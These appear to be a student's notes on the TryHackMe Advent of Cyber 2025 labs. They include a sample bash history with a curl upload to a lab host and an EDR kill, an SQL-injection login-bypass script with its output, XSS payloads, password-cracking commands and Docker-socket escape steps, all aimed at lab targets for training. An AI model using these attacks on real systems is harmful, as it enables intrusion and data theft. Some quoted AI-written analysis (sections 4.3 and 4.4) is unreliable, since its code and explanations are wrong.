https://tryhackme.com/adventofcyber25

0 Prep Track
====
0.1
----
UpTea78*$Noumum

0.2
----
https://www.virustotal.com/

0.6
----
https://haveibeenpwned.com/

1 Linux CLI - Shells Bells
====
1.1
----
Alternatively, you can use the credentials below to connect to the target machine via SSH from your own THM VPN connected machine:
Credentials
Only needed if you are using your own THM VPN connected machine.
Username
mcskidy
Password
AoC2025!
IP address
10.81.165.119
Connection via SSH
ssh mcskidy@10.81.165.119

1.2
----
Navigate to the logs directory with cd /var/log and explore its content with ls.
Run grep "Failed password" auth.log to look for the failed logins inside the auth.log.

cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"


| Symbol                 | Description                                            | Example                                           |
| :--------------------- |:------------------------------------------------------ | :-------------------------------------------------|
| Pipe symbol (\|)       | Send the output from the first command to the second   | cat unordered-list.txt \| sort \| uniq            |
| Output redirect (>/>>) | Use > to overwrite a file, and >> to append to the end | some-long-command > /home/mcskidy/output.txt      |
| Double ampersand (&&)  | Run the second command if the first was successful     | grep "secret" message.txt && echo "Secret found!" |

There are hundreds of CLI commands to view and manage your system. For example, 
uptime to see how much time your system is running, 
ip addr to check your IP address, and 
ps aux to list all processes. 
You may also check the usernames and hashed passwords of users, such as McSkidy, by running 
cat /etc/shadow. However, you'd need root permissions to do that.

Root User

Root is the default, ultimate Linux user who can do anything on the system. You can switch the user to root with sudo su, and return back to McSkidy with the exit command. Only root can open /etc/shadow and edit system settings, so this user is often a main target for attackers. If at any moment you want to verify your current user, just run whoami!

Bash History

Did you know that every command you run is saved in a hidden history file, also called Bash history? It is located at every user's home directory: /home/mcskidy/.bash_history for McSkidy, and /root/.bash_history for root, and you can check it with a convenient history command, or just read the files directly with cat.

root@tbfc-web01:/home/socmas/2025$ history
    1  whoami
    2  cd ~
    3  ll 
    4  nano .ssh/authorized_keys 
    5  curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
    6  curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
    7  curl --data "THM{until-we-meet-again}" http://flag.hopsec.thm
    8  pkill tbfcedr
    9  cat /etc/shadow
   10  cat /etc/hosts
   11  exit
   12  whoami
   13  history

Manual: https://man7.org/linux/man-pages/man1/

Rooms
-----
https://tryhackme.com/adventofcyber25/sidequest
https://tryhackme.com/room/linuxlogsinvestigations

2 Phishing - Merry Clickmas
===========================
2.2
----
https://www.allthingssecured.com/tips/email-phishing-scams-stop-method/

https://github.com/trustedsec/social-engineer-toolkit

Rooms
-----
https://tryhackme.com/room/phishingemails4gkxh

TODO: projit

3 Splunk Basics - Have you SIEM?
================================
Splunk - log analysis

TODO: projit

Rooms
-----
https://tryhackme.com/room/splunk201

4 AI in security
================
4.2 Red Team
-------------
The vulnerability exists because the SQL injection attack exploits the username field in the login form. Here's why:
1. SQL Injection Mechanism: When an attacker injects malicious SQL code into the database, it can modify queries, leading to unauthorized access. In this case, the username field is being used directly in the SQL statement, which can be manipulated to execute arbitrary code.
2. Intentional Vulnerability: The web application is intentionally designed to allow SQL injection attacks, making it a prime target for attackers.
3. Educational Context: This vulnerability is part of a controlled lab environment focused on cybersecurity, so it's for learning purposes only.

HOW TO SAVE THE FILE:
1. Open a terminal or text editor (e.g., Sublime Text).
2. Use nano script.py to create the file.
3. Paste the script (details omitted) into the file.
4. Save the file using Ctrl + X and exit.
5. Run the script via python3 script.py.

```
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# URL to the vulnerable login page
url = "http://MACHINE_IP:5000/login.php"

# Set up the payload (the input)
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```

Response:
```
Response Status Code: 200

Response Headers:
  Date: Sun, 07 Dec 2025 18:45:26 GMT
  Server: Apache/2.4.65 (Debian)
  X-Powered-By: PHP/8.1.33
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Vary: Accept-Encoding
  Content-Encoding: gzip
  Content-Length: 540
  Keep-Alive: timeout=5, max=99
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8

Response Body:
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - SQLi Lab</title>
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
</head>
<body class="dashboard-body">
    <div class="dashboard-container">
        <div class="welcome-banner">
            <h1>Welcome, admin!</h1>
            <p>You have successfully logged in to the system.</p>
        </div>
        
        
        <div class="alert alert-success alert-dismissible fade show" role="alert">
            <h4 class="alert-heading">Exploit Successful!</h4>
            <hr>
            <p class="mb-0"><code>FLAG: THM{SQLI_EXPLOIT}</code></p>
            <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
        </div>
        
        <a href="logout.php" class="btn btn-danger">Logout</a>
    </div>
    
    <script src="assets/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

4.3 Blue Team
-------------
```
Log Entries:
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

---

### Analysis of the Logs
1. IP Address: The user is identified by the IP address 198.51.100.22.
2. Time and Date: The attack occurred on October 3, 2025, at 09:03:11.
3. URL: The user accessed the login.php page.
4. Username: The username attempted was "alice%27+OR+1%3D1+--+-&password=test".
5. SQL Injection: The log indicates an SQL injection attempt by using the OR 1=1 condition in the password parameter, which is a common vulnerability in web applications.
6. Conclusion: This log shows that a SQL injection attack was attempted, suggesting potential vulnerabilities in the application.

---

### Blue Team Perspective
- Why it\u2019s important: Detecting such attacks helps identify and mitigate vulnerabilities in web applications.
- How to act:
- Analyze: Look for patterns like username manipulation or injection in log entries.
- Update: Patch the application to prevent SQL injection attacks.
- Monitor: Continuously monitor for similar patterns to detect future threats. 
```
```
198.51.100.22 - - [03/Oct/2025:09:03:11 +0100] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"
```

4.4 Software/Find Vulnerability
-------------------------------
```
<?php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';

// Example of vulnerable code (not actual SQL execution)
$statement = "SELECT * FROM users WHERE username = ? AND password = ?";
$pdo = new PDO('mysql:host=localhost;dbname=securedb', 'root', '123456');
$stmt->execute([$user, $pass]);
?>
```
1. Identification of the Specific Vulnerability
The code retrieves username and password from POST variables using ??, which is a safe way to get a value. However, if the variables are stored in a database or used in a query, an attacker could inject SQL into the query to execute arbitrary code. For example, if the username or password is used in a query like SELECT * FROM users WHERE username = ? AND password = ?, an attacker could manipulate the inputs to execute SQL commands.

2. Explanation of Why the Code is Vulnerable
This code is vulnerable to SQL injection because it assumes that the username and password inputs are stored in a database or used in a query. If the variables are not properly sanitized, an attacker could inject SQL into the query to execute arbitrary code. For example, if the username is used in a query like SELECT * FROM users WHERE username = ?, an attacker could inject a payload like '; DROP TABLE users;' to delete a table.

3. Best Practices for Preventing Similar Issues
- Sanitize inputs: Always sanitize user inputs before storing them in a database or query.
- Use prepared statements: Instead of ??, use PDO::prepare() with placeholders to prevent SQL injection.
- Validate inputs: Ensure that the inputs are validated to prevent invalid characters or malicious payloads.

4. Tools and Techniques for Code Security Testing
- Input validation: Use tools like OWASP Zed or SQLMap to test for injection.
- Secure coding practices: Follow principles like input validation, output encoding, and using secure libraries (e.g., PDO, mysqli).

Rooms
-----
https://tryhackme.com/room/defadversarialattacks

5 IDOR
=======
Hash identifier: https://hashes.com/en/tools/hash_identifier
UUID decoder: https://www.uuidtools.com/decode

Rooms
-----
https://tryhackme.com/room/idor

6 Malware analysis - Egg-xecutable
==================================
- use VM for analysis
- suspicious code/app = "sample"

Static Analysis
---------------

| Information     | Explanation                                            | Example                                           |
| :-------------- |:------------------------------------------------------ | :-------------------------------------------------|
| Checksums       | These checksums are used within cyber security to track and catalogue files and executables. For example, you can Google the checksum to see if this has been identified before.  | a93f7e8c4d21b19f2e12f09a5c33e48a |
| Strings         | "Strings" are sequences of readable characters within an executable. This could be, for example, IP addresses, URLs, commands, or even passwords! | 138.62.51.186      |
| Imports 	      | "Imports" are a list of libraries and functions that the application depends upon. For example, rather than building everything from scratch, applications will use operating system functions and libraries to interact with the OS. These are useful, especially in Windows, as they allow you to see how the application interacts with the system. | CreateFileW :  This library is used to create a file on a Windows system. |
| Resources       | "Resources" contain data such as the icon that is displayed to the user. This is useful to examine, especially since malware might use a Word document icon to trick the user. Additionally, malware itself has been known to hide in this section!  |  N/A |

- PE Studio : Malware analysis
  - Indicator: SHA256 checksum = unique identifier for the executable. We can keep a note of this SHA256 as threat intelligence
  - String: readable pieces of information (IP addresses, URLs, commands, or even passwords), can reveal the attacker's command infrastructure 

Dynamic Analysis
-----------------
- Regshot:
  -  works by creating two "snapshots" of the registry—one before the malware is run and another afterwards => compares
- A common technique for malware is to add a Run key into the registry (=> runs on startup).
- ProcMon (Process Monitor) from the Sysinternals suite

Rooms
-----
https://tryhackme.com/room/staticanalysis1
https://tryhackme.com/room/basicdynamicanalysis

7 
====
TODO: networking concepts
KEY1:3aster_

Rooms
-----
https://tryhackme.com/room/networkingconcepts
https://tryhackme.com/room/nmap

8
====
TODO: projit

Rooms
-----
https://tryhackme.com/room/defadversarialattacks

9 Passwords - A Cracking Christmas
===================================

Password guessing
-----------------
- dictionary attacks
- brute-force (or mask) attacks
  - mask attacks: limiting guesses to a specific format

Practical tips attackers use (and defenders should know about)
--------------------------------------------------------------
- Start with a wordlist (fast wins). Common lists: rockyou.txt, common-passwords.txt.
- If the wordlist fails, move to targeted wordlists (company names, project names, or data from the target).
- If that fails, try mask or incremental attacks on short passwords (e.g. ?l?l?l?d?d = three lowercase letters + two digits, which is used as a password mask format by password cracking tools).
- Use GPU-accelerated cracking when possible; it dramatically speeds up attacks for some algorithms.
- Keep an eye on resource use: cracking is CPU/GPU intensive. That behaviour can be detected on a monitored endpoint.

Exercise
---------
file flag.pdf # file info
xxd flag.pdf  # hex viewer

Tools to Use (pick one based on file type)
- PDF: pdfcrack, john (via pdf2john)
- ZIP: fcrackzip, john (via zip2john)
- General: john (very flexible) and hashcat (GPU acceleration, more advanced)
  
```
pdfcrack -f flag.pdf -w /usr/share/wordlists/rockyou.txt

zip2john flag.zip > ziphash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
john --show
7z x flag.zip -p"winter4ever"
```

Detection of Indicators and Telemetry
-------------------------------------
TODO

Rooms
-----
https://tryhackme.com/adventofcyber25/sidequest
https://tryhackme.com/room/passwordattacks

10 SOC Alert Triaging - Tinsel Triage
=====================================
- Microsoft Azure
  - Microsoft Sentinel

| Key Factors             | Description                                                                                                             | Why It Matters?                                   |
| :---------------------- |:----------------------------------------------------------------------------------------------------------------------- | :-------------------------------------------------|
| Severity Level          | Review the alert's severity rating, ranging from Informational to Critical.                                             | Indicates the urgency of response and potential business risk. |
| Timestamp and Frequency | Identify when the alert was triggered and check for related activity before and after that time.                        | Helps identify ongoing attacks or patterns of repeated behaviour. |
| Attack Stage            | Determine which stage of the attack lifecycle this alert indicates (reconnaissance, persistence, or data exfiltration). | It gives insight into how far the attacker may have progressed and their objective. |
| Affected Asset          | Identify the system, user, or resource involved and assess its importance to operations.                                | Prioritises response based on the asset's importance and the potential impact of compromise.
 |

Investigate the alert in detail.
Open the alert and review the entities, event data, and detection logic. Confirm whether the activity represents real malicious behaviour.

Check the related logs.
Examine the relevant log sources. Look for patterns or unusual actions that align with the alert.

Correlate multiple alerts.
Identify other alerts involving the same user, IP address, or device. Correlation often reveals a broader attack sequence or coordinated activity.

Build context and a timeline.
Combine timestamps, user actions, and affected assets to reconstruct the sequence of events. This helps determine if the attack is ongoing or has already been contained.

Decide on the following action.
If there are indicators of compromise, escalate to the incident response team. Investigate further if more evidence or correlation is needed. Close or suppress if the alert is a confirmed false positive, and update detection rules accordingly.

Document findings and lessons learned.
Keep a clear record of the analysis, decisions, and remediation steps. Proper documentation strengthens SOC processes and supports continuous improvement. 		

SOC = security operations center
SIEM = security information and event management system
SOAR = security orchestration, automation, and response
		
11 XSS - Merry XXSMas
=====================
XXS 
- A type of security vulnerability typically found in web applications. It allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can then steal sensitive information, like user's cookies, session tokens, or other sensitive data.
- lets attackers inject malicious code (usually JavaScript) into input fields that reflect content viewed by other users (e.g., a form or a comment in a blog)

TODO: review https://tryhackme.com/room/axss

Reflected XSS
-------------
- You see reflected variants when the injection is immediately projected in a response. Imagine a toy search function in an online toy store, you search via:
  https://trygiftme.thm/search?term=gift
- But imagine you send this to your friend who is looking for a gift for their nephew (please don't do this):
  https://trygiftme.thm/search?term=<script>alert( atob("VEhNe0V2aWxfQnVubnl9") )</script>
- If your friend clicks on the link, it will execute code instead.
- Impact: You could act, view information, or modify information that your friend or any user could do, view, or access. It's usually exploited via phishing to trick users into clicking a link with malicious code injected.
- test payload cheat sheet https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- i.e. in the Search box

Stored XSS
-----------
A Stored XSS attack occurs when malicious script is saved on the server and then loaded for every user who views the affected page. Unlike Reflected XSS, which targets individual victims, Stored XSS becomes a "set-and-forget" attack, anyone who loads the page runs the attacker’s script.
- i.e. in the Message box

Example - a comment submission:
```
POST /post/comment HTTP/1.1
Host: tgm.review-your-gifts.thm

postId=3
name=Tony Baritone
email=tony@normal-person-i-swear.net
comment=This gift set my carpet on fire but my kid loved it!
```
A malicious comment:
```
POST /post/comment HTTP/1.1
Host: tgm.review-your-gifts.thm

postId=3
name=Tony Baritone
email=tony@normal-person-i-swear.net
comment=<script>alert(atob("VEhNe0V2aWxfU3RvcmVkX0VnZ30="))</script> + "This gift set my carpet on fire but my kid loved it!"
```
Attacker may:
- Steal session cookies
- Trigger fake login popups
- Deface the page

Protecting against XSS
-----------------------
- Disable dangerous rendering raths: Instead of using the innerHTML property, which lets you inject any content directly into HTML, use the textContent property instead, it treats input as text and parses it for HTML.
- Make cookies inaccessible to JS: Set session cookies with the HttpOnly, Secure, and SameSite attributes to reduce the impact of XSS attacks.
- Sanitise input/output and encode
- TODO: links

Rooms
-----
https://tryhackme.com/room/axss
https://tryhackme.com/room/xss
		
12 Phishing - Phishmas Greetings
================================

Impersonation, Sociale Engineering
-----------------------------------

Typosquatting and Punycode
---------
= special encoding system that converts Unicode characters (used in writing systems like Chinese, Cyrillic, and Arabic) into ASCII.
- identified easily in Return-Path in the e-mail headers
  
Spoofing
---------
- person or program successfully identifies as another by falsifying data
- Authentication-Results, Return-Path in the e-mail headers
  - SPF: Says which servers are allowed to send emails for a domain (like a list of approved senders).
  - DKIM: Adds a digital signature to prove the message wasn’t changed and really came from that domain.
  - DMARC: Uses SPF and DKIM to decide what to do if something looks fake (for example, send it to spam or block it).
  - If both SPF and DMARC fail, it’s a strong sign the email is spoofed, meaning the sender isn’t who they claim to be. In this message case, everything failed!

Malicious Attachments
---------------------
 HTA/HTML files are commonly used for phishing because they run without browser sandboxing, meaning scripts have full access to the endpoint they execute on!

Legitimate Applications
------------------------
Attackers hide behind trusted services such as Dropbox, Google Drive/Docs, and OneDrive, because those links look legitimate and often pass email filters.

Fake Login Pages
-----------------
Can the "Use SSO" button save me from giving my credentials to a fake login page?
- https://www.reddit.com/r/sysadmin/comments/16mwv9s/trying_to_understand_sso_how_is_it_more_secure/
- https://faisalyahya.com/access-control/single-sign-on-a-comprehensive-how-to-guide/
- https://500apps.com/sso-protocols
- fake page example: microsoftonline.login444123.com/signin

Side Channel Communications
---------------------------
- An attacker moves the conversation off email to another channel, such as SMS, WhatsApp/Telegram, a phone or video call, a texted link, or a shared document platform, to continue the social engineering in a platform without the company's control

Rooms
-----
https://tryhackme.com/room/phishingemails3tryoe

13 YARA Rules - YARA Means One!
===============================
Purpose
--------
- Post-incident analysis: when the security team needs to verify whether traces of malware found on one compromised host still exist elsewhere in the environment.
- Threat Hunting: searching through systems and endpoints for signs of known or related malware families.
- Intelligence-based scans: applying shared YARA rules from other defenders or kingdoms to detect new indicators of compromise.
- Memory analysis: examining active processes in a memory dump for malicious code fragments.

YARA Values
------------
- Speed: quickly scans large sets of files or systems to identify suspicious ones.
- Flexibility: detects everything from text strings to binary patterns and complex logic.
- Control: lets analysts define exactly what they consider malicious.
- Shareability: rules can be reused and improved by other defenders across kingdoms.
- Visibility: helps connect scattered clues into a clear picture of the attack.

YARA Rules
-----------
- Metadata: information about the rule itself: who created it, when, and for what purpose.
- Strings: the clues YARA searches for: text, byte sequences, or regular expressions that mark suspicious content.
- Conditions: the logic that decides when the rule triggers, combining multiple strings or parameters into a single decision.

Strings
--------
- text strings
  - $xmas = "Christmas" nocase
  - $xmas = "Christmas" wide ascii
  - $hidden = "Malhare" xor
  - $b64 = "SOC-mas" base64
- hexadecimal strings
- regular expression strings

Conditions
-----------
- Match a single string
  ```
  condition:
    $xmas
  ```
- Match any string
  ```
  condition:
    any of them
  ```
- Match all strings
  ```
  condition:
    all of them
  ```
- Combine logic using: and, or, not
  ```
  condition:
    ($s1 or $s2) and not $benign
  ```
- Use comparisons like: filesize, entrypoint, or hash
  ```
  condition:
    any of them and (filesize < 700KB)
  ```

Example
-------
```
rule TBFC_example
{
    meta:
        author = "ng"
        description = "TBFC example"
        date = "2025-12-13"
        confidence = "low"

    strings:
        $a = /TBFC\:[A-Za-z0-9]+/ nocase

    condition:
        any of them
}
```

Run:
```
yara -r ./example.yar .
...
yara -s ./example.yar ./easter46.jpg
```

14 Containers - DoorDasher's Demise
====================================
A virtual machine runs on a hypervisor (software that emulates and manages multiple operating systems on one physical host). It includes a full guest OS, making it heavier but fully isolated. Containers share the host OS kernel, isolating only applications and their dependencies, which makes them lightweight and fast to start. Virtual machines are ideal for running multiple different operating systems or legacy applications, while containers excel at deploying scalable, portable micro-services.

A container engine is software that builds, runs, and manages containers by leveraging the host system’s OS kernel features like namespaces and cgroups. (i. e. Docker)
Docker is a popular container engine that uses Dockerfiles, simple text scripts defining app environments and dependencies, to build, package, and run applications consistently across different systems.

Escape Attack & Sockets
-----------------------
A container escape is a technique that enables code running inside a container to obtain rights or execute on the host kernel (or other containers) beyond its isolated environment (escaping). For example, creating a privileged container with access to the public internet from a test container with no internet access. 

Containers use a client-server setup on the host. The CLI tools act as the client, sending requests to the container daemon, which handles the actual container management and execution. The runtime exposes an API server via Unix sockets (runtime sockets) to handle CLI and daemon traffic. If an attacker can communicate with that socket from inside the container, they can exploit the runtime (this is how we would create the privileged container with internet access, as mentioned in the previous example).

```
docker ps # see running processes

docker exec -it uptime-checker sh  # access the uptime-checker container
ls -la /var/run/docker.sock
```
The Docker documentation mentions that by default, there is a setting called “Enhanced Container Isolation” which blocks containers from mounting the Docker socket to prevent malicious access to the Docker Engine. In some cases, like when running test containers, they need Docker socket access. The socket provides a means to access containers via the API directly.

By running docker ps again, we can confirm we can perform Docker commands and interact with the API; in other words, we can perform a Docker Escape attack! 

Try to access the deployer container, which is a privileged container:
```
docker exec -it deployer bash
```

Rooms
-----
https://tryhackme.com/room/containervulnerabilitiesDG

15 Web Attack Forensics - Drone Alone
=====================================

Splunk - platform for collecting, storing, and analyzing machine data

Detect Suspicious Web Commands
-------------------------------
- search the web access logs for any HTTP requests that include signs of command execution attempts:
  ```
  index=windows_apache_access (cmd.exe OR powershell OR "powershell.exe" OR "Invoke-Expression") | table _time host clientip uri_path uri_query status
  ```
- At this step, we are primarily interested in base64-encoded strings, which may reveal various types of activities. Once you spot encoded PowerShell commands, decode them using base64decode.org or your favourite base64 decoder to understand what the attacker was trying to do. https://www.base64decode.org/  

Looking for Server-Side Errors or Command Execution in Apache Error Logs
-------------------------------------------------------------------------
In this stage, we will focus on inspecting web server error logs, as this would help us uncover any malicious activity. We will use the following query:
```
index=windows_apache_error ("cmd.exe" OR "powershell" OR "Internal Server Error")
```
If a request like /cgi-bin/hello.bat?cmd=powershell triggers a 500 “Internal Server Error,” it often means the attacker’s input was processed by the server but failed during execution, a key sign of exploitation attempts.

Checking these results helps confirm whether the attack reached the backend or remained blocked at the web layer.

Trace Suspicious Process Creation From Apache
---------------------------------------------
Let’s explore Sysmon for other malicious executable files that the web server might have spawned. We will do that using the following Splunk query:
```
index=windows_sysmon ParentImage="*httpd.exe"
```
This query focuses on process relationships from Sysmon logs, specifically when the parent process is Apache (httpd.exe).

Typically, Apache should only spawn worker threads, not system processes like cmd.exe or powershell.exe.

Confirm Attacker Enumeration Activity
---------------------------------------
In this step, we aim to discover what specific programs we found from previous queries do. Let’s use the following query.
```
index=windows_sysmon *cmd.exe* *whoami*
```
This query looks for command execution logs where cmd.exe ran the command whoami.

Attackers often use the whoami command immediately after gaining code execution to determine which user account their malicious process is running as.

Finding these events confirms the attacker’s post-exploitation reconnaissance, showing that the injected command was executed on the host.

Identify Base64-Encoded PowerShell Payloads
--------------------------------------------
In this final step, we will work to find all successfully encoded commands. To search for encoded strings, we can use the following Splunk query:
```
index=windows_sysmon Image="*powershell.exe" (CommandLine="*enc*" OR CommandLine="*-EncodedCommand*" OR CommandLine="*Base64*")
```
This query detects PowerShell commands containing -EncodedCommand or Base64 text, a common technique attackers use to hide their real commands.

If your defences are correctly configured, this query should return no results, meaning the encoded payload (such as the “Muahahaha” message) never ran.

If results appear, you can decode the Base64 command to inspect the attacker’s true intent.

16 Forensics - Registry Furensics
==================================
Hives - Registry is distributed - made up of several separate files, each storing information on different configuration settings. These files are known as Hives.

| Hive Name              | Contains (Example)                                     | Location                                                       | Registry Editor                        |
| :--------------------- |:------------------------------------------------------ | :--------------------------------------------------------------|:---------------------------------------|
| SYSTEM                 | - services                                             | C:\Windows\System32\config\SYSTEM                              | HKEY_LOCAL_MACHINE\SYSTEM              |
|                        | - mounted devices                                      |                                                                |                                        |
|                        | - boot configuration                                   |                                                                |                                        |
|                        | - drivers                                              |                                                                |                                        |
|                        | - hardware                                             |                                                                |                                        |
| SECURITY               | - local security policies                              | C:\Windows\System32\config\SECURITY                            | HKEY_LOCAL_MACHINE\SECURITY            |
|                        | - audit policy settings                                |                                                                |                                        |
| SOFTWARE               | - installed programs                                   | C:\Windows\System32\config\SOFTWARE                            | HKEY_LOCAL_MACHINE\SOFTWARE            |
|                        | - OS Version and other info                            |                                                                |                                        |
|                        | - autostarts                                           |                                                                |                                        |
|                        | - program settings                                     |                                                                |                                        |
| SAM                    | - usernames and their metadata                         | C:\Windows\System32\config\SAM                                 | HKEY_LOCAL_MACHINE\SAM                 |
|                        | - password hashes                                      |                                                                |                                        |
|                        | - group memberships                                    |                                                                |                                        |
|                        | - account statuses                                     |                                                                |                                        |
| NTUSER.DAT             | - recent files                                         | C:\Users\username\NTUSER.DAT                                   | HKEY_USERS\<SID> and HKEY_CURRENT_USER |
|                        | - user preferences                                     |                                                                |                                        |
|                        | - user-specific autostarts                             |                                                                |                                        |
| USRCLASS.DAT           | - shellbags                                            | C:\Users\username\AppData\Local\Microsoft\Windows\USRCLASS.DAT | HKEY_USERS\<SID>\Software\Classes      |
|                        | - jump lists                                           |                                                                |                                        |

Windows' Registry Editor
------------------------
- view the regitry data available in the hives (binary)
- HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER, ... = registry hives organized into the **Root Keys**

- view connected USB devices:
  - Open the Registry Editor
  - Navigate to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR

- view programs run by the user: 
  - Open the Registry Editor
  - Navigate to HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

Registry Forensics
------------------
| Registry Key                                                           | Importance                                                                                                        |
| :--------------------------------------------------------------------- |:----------------------------------------------------------------------------------------------------------------- |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist     | Stores information on recently accessed applications launched via the GUI.                                        |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths     | Stores all the paths and locations typed by the user inside the Explorer address bar.                             |
| HKLM\Software\Microsoft\Windows\CurrentVersion\App Paths               | Stores the path of the applications.                                                                              |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery | Stores all the search terms typed by the user in the Explorer search bar.                                         |
| HKLM\Software\Microsoft\Windows\CurrentVersion\Run                     | Stores information on the programs that are set to automatically start (startup programs) when the users logs in. |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs     | Stores information on the files that the user has recently accessed.                                              |
| HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName        | Stores the computer's name (hostname).                                                                            |
| HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall               | Stores information on the installed programs.                                                                     |

Registry Explorer
------------------
https://ericzimmerman.github.io/
- Registry analysis cannot be done on the system under investigation (due to the chance of modification) =>  collect the Registry Hives and open them offline into our forensic workstation
- the Registry Editor does not allow opening offline hives. The Register editor also displays some of the key values in binary which are not readable.
- SHIFT + Open - opens a clean log file
  
Rooms
------
https://tryhackme.com/room/expregistryforensics

